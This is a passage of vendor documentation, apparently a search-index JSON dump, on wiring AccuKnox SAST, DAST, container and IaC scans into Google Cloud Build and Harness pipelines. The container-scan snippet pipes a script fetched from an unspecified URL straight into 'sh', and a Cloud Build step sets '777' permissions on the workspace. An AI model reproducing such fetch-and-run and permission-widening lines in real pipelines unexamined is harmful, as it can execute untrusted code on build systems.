SonarQube and AccuKnox Tokens to Google Cloud Secret Manager:</p> <ul> <li> <p>Add the following secrets:</p> <ul> <li> <p><code>SONAR_TOKEN</code>: Your SonarQube project token.</p> </li> <li> <p><code>AK_TOK</code>: The artifact token received from the AccuKnox management plane.</p> </li> </ul> </li> <li> <p>Optionally add the following instead if specifying directly in file:</p> <ul> <li> <p><code>TENANT_ID</code>: Your AccuKnox Tenant ID.</p> </li> <li> <p><code>AK_URL</code>: The AccuKnox URL (<code>cspm.accuknox.com</code>).</p> </li> <li> <p><code>SQ_URL</code>: Your SonarQube URL.</p> </li> </ul> </li> </ul> <p>Step 3: To integrate AccuKnox scans into your Google Cloud Build, set up a <code>cloudbuild.yaml</code> file in your repository with the following content:</p> <pre><code>steps:\n    # Step 1: Check Docker permissions and add user to docker group if necessary\n  - name: 'gcr.io/cloud-builders/docker'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        id\n        usermod -aG docker $(whoami) || true &amp;&amp; chmod -R 777 /workspace # Add user to docker group (ignore if already added)\n  - name: 'gcr.io/cloud-builders/gcloud'\n    entrypoint: 'bash'\n    args: [\n      '-c',\n      \"gcloud secrets versions access latest --secret=sonarqube-token --format='get(payload.data)' | tr '_-' '/+' | base64 -d &gt; /workspace/sonar-token.txt\"\n    ]\n    id: 'access-sonar-secret'\n  - name: 'docker.io/sonarsource/sonar-scanner-cli'\n    entrypoint: '/bin/sh'\n    args:\n      - '-c'\n      - |\n        sonar-scanner -X \\\n          -Dsonar.projectKey={project-name} \\\n          -Dsonar.sources=. \\\n          -Dsonar.host.url=$_SONAR_HOST_URL \\\n          -Dsonar.login=$(cat /workspace/sonar-token.txt)\n  - name: 'docker.io/accuknox/sastjob:latest'\n    entrypoint: '/bin/sh'\n    args:\n      - '-c'\n      - |\n        apt update &amp;&amp; apt-get install -y docker.io &amp;&amp; docker run --rm \\\n          -e SQ_URL=$_SONAR_HOST_URL \\\n          -e SQ_AUTH_TOKEN=$(cat /workspace/sonar-token.txt) \\\n          -e REPORT_PATH=/app/data/ \\\n          -e SQ_PROJECTS=\"^{project-name}$\" \\\n          -v $(pwd):/app/data/ \\\n          accuknox/sastjob:latest\n  # Step 5: Access the secret using gcloud and save it to a file\n  - name: 'gcr.io/cloud-builders/gcloud'\n    entrypoint: 'bash'\n    args: [\n      '-c',\n      \"gcloud secrets versions access latest --secret=accuknox_token --format='get(payload.data)' | tr '_-' '/+' | base64 -d &gt; /workspace/ak-token.txt\"\n    ]\n    id: 'access-ak-secret'\n  - name: 'gcr.io/cloud-builders/curl'\n    entrypoint: '/bin/sh'\n    args:\n      - '-c'\n      - |\n        for file in $(ls -1 SQ-*.json); do\n          curl --location --request POST \"https://$_AK_URL/api/v1/artifact/?tenant_id=$_TENANT_ID&amp;data_type=SQ&amp;save_to_s3=false\" \\\n            --header \"Tenant-Id: $_TENANT_ID\" \\\n            --header \"Authorization: Bearer $(cat /workspace/ak-token.txt)\" \\\n            --form \"file=@\\\"$file\\\"\"\n        done\nsubstitutions:\n  _SONAR_HOST_URL: \"{Sonarqube_host_url}\"\n  _AK_URL: \"{cspm.&lt;env&gt;.accuknox.com}\"\n  _TENANT_ID: \"[tenant-id]\"\nlogsBucket: \"gs://{bucket-name}\"\n</code></pre> <p>Note: In the YAML file above, you need to replace the value for the <code>{project-name}</code> with the Sonarqube project name and <code>{Sonarqube_host_url}</code> with the actual Sonarqube URL. Under substitution, replace <code>\"{cspm.&lt;env&gt;.accuknox.com}\"</code> with the applicable \"cspm env-name\" (e.g. demo or use <code>\"{cspm.accuknox.com}\"</code> if you are making use of a paid SaaS subscription), replace <code>{bucket-name}</code> with your GCP bucket name, and replace <code>[tenant-id]</code> with your tenant ID copied in the Step 1.</p>"},{"location":"integrations/google-sast/#before-accuknox-scan","title":"Before AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. When you push the changes to the repository it gets deployed without any security checks, potentially allowing the SQL Injection vulnerability in the application</p>"},{"location":"integrations/google-sast/#after-accuknox-scan-integration","title":"After AccuKnox Scan Integration","text":"<p>After integrating AccuKnox into your CI/CD pipeline, the next push triggers the Google Cloudbuild Actions workflow. The AccuKnox scan identifies the SQL Injection vulnerability in the JAVA application</p> <p></p>"},{"location":"integrations/google-sast/#view-the-results-in-accuknox-saas","title":"View the Results in AccuKnox Saas","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Vulnerabilities and select Data Type as SonarQube to view the identified vulnerabilities, including the SQL Injection vulnerability in <code>VulnerableApp.java</code>.</p> <p></p> <p>Step 3: Click on the Vulnerability to view more details</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>To fix the SQL Injection vulnerability, use prepared statements instead of concatenating user input directly into the SQL query as seen in the Solutions tab.</p> <p></p> <p>Step 5: Create a ticket for fixing the SQL Injection vulnerability by selecting a Ticket Configuration and clicking on the adjacent button.</p> <p></p> <p>Step 6: Review the Updated Results</p> <ul> <li> <p>After fixing the vulnerability, please rerun the cloud build workflow.</p> </li> <li> <p>Once the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> </li> <li> <p>Go to Issues &gt; Vulnerabilities and select Data Type as SonarQube to verify that the SQL Injection vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/google-sast/#conclusion","title":"Conclusion","text":"<p>Google offers a complete ecosystem for CI/CD that includes Google Cloud Build, Google Cloud Registry, Google Cloud Repository, and Google Secret Manager. AccuKnox code scanning brings several benefits to the mix:</p> <ul> <li> <p>Code scanning in a CI/CD pipeline stops Security issues from reaching the deployment.</p> </li> <li> <p>From AccuKnox Saas users can view the findings and mitigate the CRITICAL/HIGH findings.</p> </li> <li> <p>Once the issues are resolved, users can trigger the scan again and observe the changes in the findings to ensure that the updated code successfully deploys the application.</p> </li> </ul> <p>AccuKnox SAST also integrates seamlessly with most CI/CD pipeline tools, including Jenkins, GitHub, GitLab, Azure Pipelines, AWS CodePipelines, etc</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/harness-container-scan/","title":"Container Image Scan in Harness Pipeline","text":""},{"location":"integrations/harness-container-scan/#scenario","title":"Scenario","text":"<p>A build and deploy pipeline is already present in Harness. To improve security in the pipeline, the AccuKnox scan stage is added to perform a vulnerability scan of the container image before it is built/deployed. The scan can also be configured to fail the pipeline in case a vulnerability of specified severity/severities is found, ensuring that vulnerable images are not allowed to be used.</p>"},{"location":"integrations/harness-container-scan/#prereqisites","title":"Prereqisites","text":"<ul> <li> <p>Harness Account</p> </li> <li> <p>A Codebase with a Dockerfile</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/harness-container-scan/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/harness-container-scan/#on-the-accuknox-platform","title":"On the AccuKnox platform","text":""},{"location":"integrations/harness-container-scan/#generate-token-from-the-accuknox-platform","title":"Generate token from the AccuKnox platform","text":"<ol> <li>Navigate to Settings \u2192 Tokens and click on Create Token</li> </ol> <ol> <li> <p>Click on Generate</p> </li> <li> <p>Copy the Token and Tenant ID</p> </li> </ol>"},{"location":"integrations/harness-container-scan/#create-a-label","title":"Create a Label","text":"<ol> <li>Navigate to Settings \u2192 Labels</li> </ol> <ol> <li> <p>Click on the Label + button at the top right</p> </li> <li> <p>Enter a unique identifier for the label in the Name and Filename Prefix fields</p> </li> <li> <p>Click on Save</p> </li> </ol>"},{"location":"integrations/harness-container-scan/#on-the-harness-platform","title":"On the Harness Platform","text":"<p>Step 1: Setup a Stage for the scan in the Harness Pipeline where the Dockerfile repository is integrated.</p> <p>Make sure Clone Codebase is enabled.</p> <p></p> <p>Step 2: Create a Run step in the stage</p> <p></p> <p>In the Run step configuration,</p> <ul> <li> <p>Select the shell as Bash</p> </li> <li> <p>Copy paste the below code into the Command box:</p> </li> </ul> <pre><code>docker build -t ${repository_name}:${tag} -f ${dockerfile_context} .\ncurl -sfL $url | sh -s -- -b /usr/local/bin &gt; /dev/null\ndocker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\\n-v $HOME/Library/Caches:/root/.cache/ accuknox/accuknox-container-scan:latest image ${repository_name}:${tag} -f json --quiet &gt; results.json\ncat ./results.json\ncurl --location --request POST 'https://'\"${endpoint}\"'/api/v1/artifact/?tenant_id='\"${tenant_id}\"'&amp;data_type=TR&amp;save_to_s3=true&amp;label_id='\"${label_id}\" --header 'Tenant-Id: '\"${tenant_id}\" --header 'Authorization: Bearer '\"${token}\" --form 'file=@\"./results.json\"'\nsevere=$(echo ${severity} | sed 's/,/\\\\|/g')\nif [ ${exit_code} -eq 1 ];then\n  if grep -qi \"${severe}\" results.json; then\n    echo \"\\nAccuKnox Scan has halted the deployment because it detected vulnerabilities of severity ${severity}\"\n    exit 1\n  else\n    echo \"\\nAccuKnox Checks Passed\"\n  fi\nfi\n</code></pre> <ul> <li>Click on Apply Changes</li> </ul> <p></p> <p>Step 3: Add the AccuKnox token in Harness as a secret</p> <ul> <li>Navigate to Project Settings and click on Secrets</li> </ul> <p></p> <ul> <li>Create a new Text Secret, with the AccuKnox token as the secret value. Also specify a Name for the Secret to be used in the pipeline</li> </ul> <p></p> <p>Step 4: Create variables to be passed to the Run step. The following variables have been set at Stage level in this example:</p> <ul> <li> <p><code>tenant_id</code> - The ID of the tenant from the AccuKnox Platform</p> </li> <li> <p><code>token</code> - The token to authenticate with the AccuKnox platform. Use the id of the secret created in the previous step</p> </li> <li> <p><code>label_id</code> - The Name of the label that was created in the AccuKnox platform</p> </li> <li> <p><code>repository_name</code> - The name of the image in <code>repo/image</code> format</p> </li> <li> <p><code>tag</code>- The tag of the image being built</p> </li> <li> <p><code>dockerfile_context</code>- The path to <code>Dockerfile</code> within the codebase</p> </li> <li> <p><code>exit_code</code>- Can be set to \"1\" to fail the pipeline when vulnerabilities are identified of the specified severity/severities</p> </li> <li> <p><code>endpoint</code>- The AccuKnox platform endpoint (<code>cspm.demo.accuknox.com</code>). Remove demo if you are using a paid subscription of AccuKnox</p> </li> <li> <p><code>severity</code>- Possible values are <code>UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL</code>. Only vulnerabilities of specified severity will be reported. Can specify multiple values separated by commas.</p> </li> </ul> <p>The variables can be added by using the Variables option in the right bar (or) the below code block can be copied into the Stage level of the pipeline yaml and the values changed accordingly.</p> <pre><code>        variables:\n          - name: tenant_id\n            type: String\n            description: \"The ID of the tenant in AccuKnox\"\n            required: true\n            value: \"000\"\n          - name: token\n            type: Secret\n            description: \"Token to authenticate with the AccuKnox Platform\"\n            required: true\n            value: AK_Token\n          - name: label_id\n            type: String\n            description: \"The label name for identifying results in AccuKnox\"\n            required: true\n            value: \"LABEL\"\n          - name: repository_name\n            type: String\n            description: \"The image name in repository/image format\"\n            required: true\n            value: harness/test\n          - name: tag\n            type: String\n            description: \"The tag of the Docker image being built\"\n            required: true\n            value: v1\n          - name: exit_code\n            type: String\n            description: \"Set exit code to 1 to fail the pipe or use 0 to ignore vulnerabilities\"\n            required: true\n            value: \"1\"\n          - name: dockerfile_context\n            type: String\n            description: \"The path to Dockerfile in the codebase\"\n            required: true\n            value: Dockerfile\n          - name: endpoint\n            type: String\n            description: \"The AccuKnox platform endpoint\"\n            required: true\n            value: cspm.demo.accuknox.com\n          - name: severity\n            type: String\n            description: \"The severity of vulnerabilities to check. Values can be UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL separated by commas\"\n            required: true\n            value: UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL\n</code></pre>"},{"location":"integrations/harness-container-scan/#sample-use-case","title":"Sample Use Case","text":"<p>Consider a scenario where any container image with critical vulnerabilities should not be allowed. This can be achieved through the AccuKnox Container Image scan by performing the following:</p> <p>Step 1: Set the variables</p> <ul> <li> <p>Set <code>exit_code</code>to <code>1</code> (Will not fail the pipeline if set to <code>0</code>)</p> </li> <li> <p>Set <code>severity</code>to <code>CRITICAL</code></p> </li> </ul> <p></p> <p>Step 2: Place the scan before the build and deploy step of the pipeline and Run the pipeline</p> <p></p> <p>It can be seen that the scan stage fails the deployment pipeline as the AccuKnox Container scan is run. The reason can be seen at the end of the Step logs:</p> <p><code>AccuKnox Scan has halted the deployment because it detected vulnerabilities of severity CRITICAL</code></p> <p>Navigate to Issues \u2192 Registry Scan to view the scan results on the AccuKnox Platform.</p> <p></p>"},{"location":"integrations/harness-container-scan/#conclusion","title":"Conclusion","text":"<p>Thus, AccuKnox can prevent the images with critical severity to be used in the pipeline. The results populated on the platform will provide insights into the vulnerabilities present in the image and any solutions if applicable. This information can then be used to fix the issues before deploying the application. Ultimately, this approach helps enforce Shift left security in the DevOps pipeline.</p>"},{"location":"integrations/harness-dast/","title":"Integrating Harness DAST with AccuKnox for Security Scanning","text":"<p>This document outlines the steps to integrate AccuKnox DAST scanning into the Harness Pipeline. This will allow automating the scan to be triggered on events. The results from the scan will then be visible on the AccuKnox platform for management and resolution.</p>"},{"location":"integrations/harness-dast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Harness Pipeline</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/harness-dast/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/harness-dast/#on-the-accuknox-platform","title":"On the AccuKnox platform","text":"<p>Step 1: Navigate to Settings \u2192 Labels and click on the Add Label button.</p> <p></p> <p>Enter a name for the label, use the same as the filename prefix and click on Save</p> <p>Step 2: Go to Settings \u2192 Tokens then click on the Create button</p> <p></p> <p>In the subsequent popup, provide a name for the token and click on Generate</p> <p></p> <p>Copy the Tenant Id and click on Copy to fetch the API token. These values will be used in the Harness Pipeline.</p>"},{"location":"integrations/harness-dast/#on-harness","title":"On Harness","text":"<p>Step 1: Create a secret in Harness to store the AccuKnox token.</p> <p>Navigate to Project Settings \u2192 Click on Secrets</p> <p></p> <p>Select New Secret and click on Text in the dropdown</p> <p></p> <p>Enter a Name for the secret, paste the token copied from the AccuKnox platform as the secret value and click on Save</p> <p></p> <p>Step 2: Create a stage in the pipeline for the scanning</p> <p>Navigate to an existing pipeline or create a new pipeline and add a Build Stage into the pipeline</p> <p></p> <p>Provide a name and Set Up the Stage. (This doc assumes that the application has already been deployed on the environment and the endpoint is exposed)</p> <p></p> <p>Select the infrastructure to run the scan and click on continue</p> <p></p> <p>Step 3: Setup the scanner</p> <p>Switch to YAML view and paste the below snippet at the end:</p> <pre><code>          execution:\n            steps:\n              - step:\n                  type: Run\n                  name: Run_DAST\n                  identifier: Run_DAST\n                  spec:\n                    shell: Sh\n                    command: |-\n                      mkdir -m 777 /harness/results\n                      echo \"TARGET_URL=&lt;+stage.variables.TARGET_URL&gt;\" &gt;&gt; /harness/results/env.sh\n                      docker run --rm -v /harness/results:/zap/wrk/:rw -t zaproxy/zap-stable zap-baseline.py \\\n                        -t \"&lt;+stage.variables.TARGET_URL&gt;\" \\\n                        -r scanreport.html \\\n                        -x scanreport.xml \\\n                        -J scanreport.json || alert_found=\"yes\"\n                      curl --location --request POST \"&lt;+stage.variables.ENDPOINT&gt;/api/v1/artifact/?tenant_id=&lt;+stage.variables.TENANT_ID&gt;&amp;data_type=ZAP&amp;save_to_s3=true&amp;label_id=&lt;+stage.variables.LABEL&gt;\" \\\n                                  --header \"Tenant-Id: &lt;+stage.variables.TENANT_ID&gt;\" \\\n                                  --header \"Authorization: Bearer &lt;+stage.variables.ACCUKNOX_TOKEN&gt;\" \\\n                                  --form \"file=@/harness/results/scanreport.json\"\n                      if [ \"&lt;+stage.variables.FAIL_ACTION&gt;\" -eq 1 ];then\n                        if [ -n \"$alert_found\" ]; then\n                          echo \"Security alerts raised, pipeline will be halted\"\n                          exit 1\n                        else\n                          echo \"Scan has passed\"\n                        fi\n                      fi\n        variables:\n          - name: TARGET_URL\n            type: String\n            description: \"The target URL to be scanned\"\n            required: true\n            value: \"\"\n          - name: ENDPOINT\n            type: String\n            description: \"The AccuKnox endpoint to forward the results\"\n            required: true\n            value: https://cspm.demo.accuknox.com\n          - name: TENANT_ID\n            type: String\n            description: \"The tenant ID fetched from AccuKnox platform\"\n            required: true\n            value: \"167\"\n          - name: ACCUKNOX_TOKEN\n            type: Secret\n            description: \"The API Token fetched from AccuKnox platform\"\n            required: true\n            value: AK_Token\n          - name: LABEL\n            type: String\n            description: \"The name of the label generated from the AccuKnox platform\"\n            required: true\n            value: \"\"\n          - name: FAIL_ACTION\n            type: String\n            description: \"Fails the pipeline on discovering issues if set to '1'. No action if set to '0'\"\n            required: true\n            value: \"0\"\n</code></pre> <p></p> <p>Step 4: Set the variables for scanning</p> <p>Click on variables to the right and set the value of the variables:</p> <ul> <li> <p><code>TARGET_URL</code>: The target URL to be scanned</p> </li> <li> <p><code>ENDPOINT</code>: The AccuKnox endpoint to forward the results. (Set to AccuKnox Endpoint <code>https://cspm.accuknox.com</code>. Eg. For <code>app.demo.accuknox.com</code>, this is set to <code>https://cspm.demo.accuknox.com</code>)</p> </li> <li> <p><code>TENANT_ID</code>: The tenant ID fetched from AccuKnox platform</p> </li> <li> <p><code>ACCUKNOX_TOKEN</code>: The API Token fetched from AccuKnox platform. (Set to the secret that was created in the first step)</p> </li> <li> <p><code>LABEL</code>: The name of the label generated from the AccuKnox platform</p> </li> <li> <p><code>FAIL_ACTION</code>: Fails the pipeline on discovering issues if set to '1'. No action if set to '0'</p> </li> </ul> <p></p> <p>After confirming the variables, click on Apply Changes and Save</p>"},{"location":"integrations/harness-dast/#pipeline-execution","title":"Pipeline Execution","text":"<p>The pipeline has now been configured, click on Run to trigger the scan. Since the <code>FAIL_ACTION</code>is set to 0, the pipeline has succeeded without isssues.</p> <p></p> <p>If the <code>FAIL_ACTION</code>is set to 1, then the pipeline fails with the message <code>\"Security alerts raised, pipeline will be halted\"</code> on identifying any issues in the scan.</p> <p></p>"},{"location":"integrations/harness-dast/#view-results","title":"View Results","text":"<p>To view the scan results on the AccuKnox platform, navigate to Issues \u2192 Findings and select DAST Findings from the Findings Type dropdown filter.</p> <p></p>"},{"location":"integrations/harness-iac-scan/","title":"IaC Scan in Harness CI","text":""},{"location":"integrations/harness-iac-scan/#scenario","title":"Scenario","text":"<p>A build and deploy pipeline is already present in Harness. To improve security in the pipeline, the AccuKnox scan stage is added to perform a scan of the IaC files before the infrastructure is deployed. The scan can also be configured to fail the pipeline in case a security misconfiguration is identifies, ensuring that vulnerable resources are not deployed.</p>"},{"location":"integrations/harness-iac-scan/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Harness Account</p> </li> <li> <p>A Codebase with IaC files</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/harness-iac-scan/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/harness-iac-scan/#on-the-accuknox-platform","title":"On the AccuKnox platform","text":""},{"location":"integrations/harness-iac-scan/#generate-token","title":"Generate token","text":"<ol> <li>Navigate to Settings \u2192 Tokens and click on Create Token</li> </ol> <ol> <li> <p>Click on Generate</p> </li> <li> <p>Copy the Token and Tenant ID</p> </li> </ol>"},{"location":"integrations/harness-iac-scan/#create-label","title":"Create Label","text":"<ol> <li> <p>Navigate to Settings \u2192 Labels</p> </li> <li> <p>Click on the Label + button at the top right</p> </li> </ol> <p></p> <ol> <li> <p>Enter a unique identifier for the label in the Name and Filename Prefix fields</p> </li> <li> <p>Click on Save</p> </li> </ol>"},{"location":"integrations/harness-iac-scan/#on-the-harness-platform","title":"On the Harness Platform","text":"<p>Step 1: Add the AccuKnox token in Harness as a secret</p> <ul> <li>Navigate to Project Settings and click on Secrets</li> </ul> <p></p> <ul> <li>Create a new Text Secret, with the AccuKnox token as the secret value. Also specify a Name for the Secret to be used in the pipeline</li> </ul> <p></p> <p>Step 2: Setup a Stage for the scan in the Harness Pipeline where the IaC files repository is integrated.</p> <p>Make sure Clone Codebase is enabled.</p> <p></p> <p>Step 3: Create a Plugin step in the stage</p> <p></p> <p>On the Plugin Step configuration,</p> <ul> <li> <p>Enter a Name for the plugin step</p> </li> <li> <p>In the Image field enter the following: <code>accuknox/harness-iac-plugin:v1</code></p> </li> </ul> <p></p> <ul> <li> <p>Click on Optional Configuration and add the following Keys and Values:</p> </li> <li> <p>repo_id: The name of the repository in the format <code>https://repo_url.com/username/reponame</code></p> </li> <li> <p>branch: The branch of the repo to be scanned</p> </li> <li> <p>endpoint: <code>cspm.accuknox.com</code> (Will differ based on the platform. Eg. For the demo platform, the endpoint is <code>cspm.demo.accuknox.com</code>)</p> </li> <li> <p>tenant_id: The tenant id copied from AccuKnox platform</p> </li> <li> <p>label: The label name copied from AccuKnox platform</p> </li> <li> <p>token: The secret used to store the token referred by format <code>&lt;+secrets.getValue(\"Secret_Name\")&gt;</code></p> </li> </ul> <p></p> <p>Optional Variables:</p> <ul> <li> <p>The following keys and values can be used as per requirements and are not mandatory:</p> </li> <li> <p>directory: To specify the root directory containing the IaC files. Defaults to <code>/harness</code> which is where the cloned repository is mounted.</p> </li> <li> <p>hard_fail: Set to '1' to fail the pipeline when any issues are detected.</p> </li> <li> <p>output_path: The path where the results will be stored. Defaults to <code>/results</code></p> </li> <li> <p>quiet: For the Console output, display only failed checks</p> </li> <li> <p>compact: For the Console output, do not display code blocks</p> </li> <li> <p>skip_framework: Filter scan to skip specific IaC frameworks. Add multiple frameworks using spaces. For example, \"terraform kubernetes\".</p> </li> <li> <p>Possible values: bitbucket_pipelines, argo_workflows, arm, bicep, cloudformation, dockerfile, github_configuration, github_actions, gitlab_configuration, gitlab_ci, bitbucket_configuration, helm, json, yaml, kubernetes, kustomize, openapi, sca_package, sca_image, secrets, serverless, terraform, terraform_plan</p> </li> <li> <p>skip_path: Path (file or directory) to skip, using regular expression logic, relative to the current working directory.</p> </li> </ul> <p>After specifying the required variables, click on Apply Changes.</p>"},{"location":"integrations/harness-iac-scan/#sample-use-case","title":"Sample Use Case","text":"<p>Consider a scenario where the resources are being provisioned in the production environment. To make sure that there are no secuity issues in production, we would like to stop the deployment if any issues are detected in the IaC files. In this scenario, the IaC scanner will be integrated into the pipeline before the deployment phase with the <code>hard_fail</code> value set to 1.</p> <p></p> <p>Now, when the pipeline runs, the scanner checks for issues in the IaC file and is any issues are identified, it stops the pipeline with the message:</p> <p><code>Failed checks identified, pipeline hard fail is initiated</code></p> <p></p> <p>To view the failed checks that need to be resolved, navigate to Issues \u2192 Findings on the AccuKnox platform and select the IaC Findings filter.</p> <p></p>"},{"location":"integrations/harness-iac-scan/#conclusion","title":"Conclusion","text":"<p>Thus, AccuKnox can prevent the IaC files with security issues to be deployed into production, preventing potential exposure. The results populated on the platform will provide insights into the issues and any associated solutions if applicable. This information can then be used to fix the issues before deploying the resources in a secure manner. Ultimately, this approach helps enforce Shift left security in the DevOps pipeline.</p>"},{"location":"integrations/harness-overview/","title":"Harness Integrations","text":""},{"location":"integrations/harness-overview/#harness-integrations","title":"Harness Integrations","text":"<p>SAST (Static Analysis)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p>"},{"location":"integrations/harness-sast/","title":"Integrating Harness SAST with AccuKnox CNAPP","text":"<p>This document outlines the steps to integrate AccuKnox SAST scanning into the Harness Pipeline. This will allow automating the scan to be triggered on events. The results from the scan will then be visible on the AccuKnox platform for management and resolution.</p>"},{"location":"integrations/harness-sast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Harness Pipeline</p> </li> <li> <p>SonarQube Instance with access from Harness Pipeline</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/harness-sast/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/harness-sast/#on-the-accuknox-platform","title":"On the AccuKnox platform","text":"<p>Step 1: Navigate to Settings \u2192 Labels and click on the Add Label button.</p> <p></p> <p>Enter a name for the label, use the same as the filename prefix and click on Save</p> <p>Step 2: Go to Settings \u2192 Tokens then click on the Create button</p> <p></p> <p>In the subsequent popup, provide a name for the token and click on Generate</p> <p></p> <p>Copy the Tenant Id and click on Copy to fetch the API token. These values will be used in the Harness Pipeline.</p>"},{"location":"integrations/harness-sast/#on-sonarqube","title":"On SonarQube","text":"<p>Step 1: Create a new local project on SonarQube and note the project key. Reference docs</p> <p>Step 2: Generate SonarQube User Token following the instructions in the official sonarqube docs. Note the token generated.</p>"},{"location":"integrations/harness-sast/#on-harness","title":"On Harness","text":"<p>Step 1: Create secrets in Harness to store the AccuKnox token and the SonarQube token.</p> <p>Navigate to Project Settings \u2192 Click on Secrets</p> <p></p> <p>Select New Secret and click on Text in the dropdown</p> <p></p> <p>Enter a Name for the secret, paste the token copied from the AccuKnox platform as the secret value and click on Save</p> <p></p> <p>Create another secret with the same method for the token generated from SonarQube</p> <p></p> <p>Step 2: Create a stage in the pipeline for the scanning</p> <p>Navigate to an existing pipeline or create a new pipeline and add a Build Stage into the pipeline</p> <p></p> <p>Clone the codebase that needs to be scanned</p> <p></p> <p>Select the infrastructure to run the scan and click on Continue.</p> <p>Step 3: Setup the scanner</p> <p>Switch to the YAML view and paste the below snippet at the end:</p> <pre><code>          execution:\n            steps:\n              - step:\n                  type: Run\n                  name: AccuKnox_SAST\n                  identifier: SAST_Scan\n                  spec:\n                    shell: Bash\n                    command: |-\n                      docker run --rm -e SONAR_HOST_URL=\"&lt;+stage.variables.SQ_URL&gt;\" -e SONAR_SCANNER_OPTS=\"-Dsonar.projectKey=\"&lt;+stage.variables.SQ_PROJECT&gt;\" -Dsonar.qualitygate.wait=\"&lt;+stage.variables.QUALITY_GATE&gt;\"\" -e SONAR_TOKEN=\"&lt;+stage.variables.SQ_TOKEN&gt;\" -v \"$(pwd):/usr/src\" sonarsource/sonar-scanner-cli || Quality_Gate=\"Failed\"\n                      docker run --rm -e SQ_URL=\"&lt;+stage.variables.SQ_URL&gt;\" -e SQ_AUTH_TOKEN=\"&lt;+stage.variables.SQ_TOKEN&gt;\" -e SQ_PROJECTS=\"&lt;+stage.variables.SQ_PROJECT&gt;\" -e REPORT_PATH=/app/data -v $(pwd):/app/data accuknox/sastjob:latest\n                      for file in `ls -1 SQ-*.json`; do\n                        curl --location --request POST \"&lt;+stage.variables.ENDPOINT&gt;/api/v1/artifact/?tenant_id=&lt;+stage.variables.TENANT_ID&gt;&amp;data_type=SQ&amp;save_to_s3=true&amp;label_id=&lt;+stage.variables.LABEL&gt;\" \\\n                                  --header \"Tenant-Id: &lt;+stage.variables.TENANT_ID&gt;\" \\\n                                  --header \"Authorization: Bearer &lt;+stage.variables.ACCUKNOX_TOKEN&gt;\" \\\n                                  --form \"file=@/harness/$file\"\n                      done\n                      if [ \"&lt;+stage.variables.QUALITY_GATE&gt;\" -eq 1 ];then\n                        if [ \"$Quality_Gate\" == \"Failed\" ]; then\n                          echo \"Quality Gate has failed, pipeline will be halted\"\n                          exit 1\n                        else\n                          echo \"Quality Gate passed\"\n                        fi\n                      fi\n        variables:\n          - name: SQ_URL\n            type: String\n            description: \"The URL to access the SonarQube deployment\"\n            required: true\n            value: https://your.sonarqube.com/\n          - name: ENDPOINT\n            type: String\n            description: \"The AccuKnox endpoint to forward the results\"\n            required: true\n            value: https://cspm.demo.accuknox.com\n          - name: TENANT_ID\n            type: String\n            description: \"The tenant ID fetched from AccuKnox platform\"\n            required: true\n            value: \"\"\n          - name: ACCUKNOX_TOKEN\n            type: Secret\n            description: \"The API Token fetched from AccuKnox platform\"\n            required: true\n            value: \"\"\n          - name: LABEL\n            type: String\n            description: \"The name of the label generated from the AccuKnox platform\"\n            required: true\n            value: \"\"\n          - name: SQ_TOKEN\n            type: Secret\n            description: \"The token generated from the SonarQube Platform\"\n            required: true\n            value: \"\"\n          - name: SQ_PROJECT\n            type: String\n            description: \"The name/key of the project created in SonarQube\"\n            required: true\n            value: \"\"\n          - name: QUALITY_GATE\n            type: String\n            description: \"Set to 'true' to fail the pipeline when Quality Gate fails. No action if set to 'false'\"\n            required: true\n            value: \"false\"\n</code></pre> <p></p> <p>Step 4: Set the variables for scanning</p> <p>Click on variables to the right and set the value of the variables:</p> <ul> <li> <p><code>SQ_URL</code>: The URL to access the SonarQube deployment</p> </li> <li> <p><code>ENDPOINT</code>: The AccuKnox endpoint to forward the results. (Set to AccuKnox Endpoint <code>https://cspm.accuknox.com</code>. Eg. For <code>app.demo.accuknox.com</code>, this is set to <code>https://cspm.demo.accuknox.com</code>)</p> </li> <li> <p><code>TENANT_ID</code>: The tenant ID fetched from AccuKnox platform</p> </li> <li> <p><code>ACCUKNOX_TOKEN</code>: The API Token fetched from AccuKnox platform. (Set to the secret that was created in the first step)</p> </li> <li> <p><code>LABEL</code>: The name of the label generated from the AccuKnox platform</p> </li> <li> <p><code>QUALITY_GATE</code>: Fails the pipeline if Quality Gate fails when set to 'true'. No action if set to 'false'</p> </li> <li> <p><code>SQ_TOKEN</code>: The token generated from the SonarQube Platform</p> </li> <li> <p><code>SQ_PROJECT</code>: The name/key of the project created in SonarQube</p> </li> </ul> <p></p> <p>After confirming the variables, click on Apply Changes and Save</p>"},{"location":"integrations/harness-sast/#pipeline-execution","title":"Pipeline Execution","text":"<p>The pipeline has now been configured, click on Run to trigger the scan. Since the <code>QUALITY_GATE</code> has passed, the pipeline has succeeded without isssues.</p> <p></p> <p>If the <code>QUALITY_GATE</code> has failed, then the pipeline will be halted with the message <code>Quality Gate has failed, pipeline will be halted</code></p> <p>To run the pipeline successfully irrespective of quality gate status, set the <code>QUALITY_GATE</code> variable to <code>false</code>.</p>"},{"location":"integrations/harness-sast/#view-results","title":"View Results","text":"<p>To view the scan results on the AccuKnox platform, navigate to Issues \u2192 Findings and select Static Code Analysis Findings from the Findings Type dropdown filter.</p> <p></p>"},{"location":"integrations/jenkins-container-scan/","title":"Jenkins Container 